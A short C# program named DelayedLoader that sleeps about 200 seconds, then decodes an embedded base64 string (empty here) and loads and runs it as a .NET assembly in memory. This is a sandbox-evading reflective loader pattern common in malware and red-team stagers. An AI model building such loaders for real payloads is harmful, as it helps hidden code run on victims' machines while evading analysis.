class DelayedLoader
{

    static void Main(string[] args)
    {
        System.Console.WriteLine("Sleeping ...");
        System.Threading.Thread.Sleep(200000);
        System.Console.WriteLine("Sleep is over!");

        string s = "";

        byte[] assemblyBytes = System.Convert.FromBase64String(s);
            
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(assemblyBytes);
        System.Console.WriteLine("Loaded Assembly");
        assembly.EntryPoint.Invoke(null, new object[]{ args });
        System.Console.WriteLine("Assembly was executed");
    }
}












